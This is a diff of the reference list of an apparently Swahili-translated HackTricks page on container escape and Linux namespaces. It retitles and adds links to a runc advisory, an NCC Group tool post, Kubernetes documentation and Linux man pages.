-- [1] [Ushauri wa usalama wa runc: container escape kupitia matumizi mabaya ya "masked path" kutokana na mount race conditions (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
-- [2] [Kutolewa kwa Tool – insject: Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
+- [1] [Ushauri wa usalama wa runc: kutoroka kutoka kwa container kupitia matumizi mabaya ya "masked path" kutokana na hali za race za mount (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
+- [2] [Toleo la zana – insject: Kichomezi cha Linux Namespace](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
 - [3] [Kitabu cha Linux man-pages 6.19](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
-- [4] [Kushiriki Process Namespace kati ya Containers katika Pod](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
+- [4] [Shiriki Process Namespace kati ya Containers katika Pod](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
+- [5] [Utatuzi wa Pods Zinazoendesha](https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/)
+- [6] [KEP ya Ephemeral Containers](https://www.kubernetes.dev/resources/keps/277/)
+- [7] [Viwango vya Usalama wa Pod](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
+- [8] [proc_pid_root(5)](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
+- [9] [nsenter(1)](https://man7.org/linux/man-pages/man1/nsenter.1.html)
+- [10] [chroot(2)](https://man7.org/linux/man-pages/man2/chroot.2.html)
 {{#include ../../../../../banners/hacktricks-training.md}}
